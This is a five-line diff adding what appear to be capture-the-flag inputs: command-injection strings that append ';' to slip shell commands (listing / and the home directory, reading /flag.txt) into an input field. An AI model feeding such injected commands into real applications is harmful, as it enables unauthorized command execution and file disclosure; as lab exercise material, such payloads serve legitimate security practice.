@@ -1,0 +1,5 @@
+f
+; ls / ; echo
+; ls ~ ; echo
+f
+; cat /flag.txt ; echo
